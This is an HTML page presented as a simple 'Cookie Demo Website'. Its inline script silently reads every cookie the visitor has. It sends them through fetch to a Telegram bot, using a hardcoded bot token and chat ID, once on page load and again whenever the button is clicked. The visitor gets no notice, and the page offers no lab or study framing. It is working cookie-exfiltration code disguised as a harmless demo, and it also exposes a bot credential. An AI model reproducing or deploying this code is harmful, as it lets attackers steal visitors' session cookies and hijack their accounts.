<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Demo Website</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Welcome to Cookie Demo</h1>
    <p id="cookie-status">Checking your cookie...</p>
    <button id="set-cookie-btn">Set a Cookie</button>
</div>

<script>
    // Function to set a cookie
    function setCookie(name, value, days) {
        const d = new Date();
        d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
        let expires = "expires=" + d.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Function to get all cookies as a string
    function getAllCookies() {
        return document.cookie;
    }

    // Function to send cookies to Telegram via a bot
    function sendCookiesToTelegram(cookieValue) {
        const botToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8';  // Your bot token
        const chatId = '693873866';  // Your chat ID
        const message = encodeURIComponent(`Extracted Cookies: ${cookieValue}`);

        // Fetch API to send the message to Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
            .then(response => {
                if (response.ok) {
                    console.log("Cookies sent to Telegram successfully.");
                } else {
                    console.log("Failed to send cookies to Telegram.");
                }
            })
            .catch(error => {
                console.error("Error sending message to Telegram:", error);
            });
    }

    // Check for the cookie when the user visits
    const cookieStatus = document.getElementById("cookie-status");
    const cookies = getAllCookies();

    if (cookies) {
        cookieStatus.textContent = `Cookies found: ${cookies}`;
        sendCookiesToTelegram(cookies);  // Automatically send all cookies to Telegram
    } else {
        cookieStatus.textContent = "No cookies found.";
    }

    // Set a cookie when the button is clicked
    document.getElementById("set-cookie-btn").addEventListener("click", () => {
        const username = prompt("Please enter your name:", "John Doe");
        if (username) {
            setCookie("username", username, 7);  // Set cookie to expire in 7 days
            cookieStatus.textContent = `Cookie set! Welcome, ${username}.`;
            sendCookiesToTelegram(getAllCookies());  // Send all cookies to Telegram
        }
    });
</script>

</body>
</html>
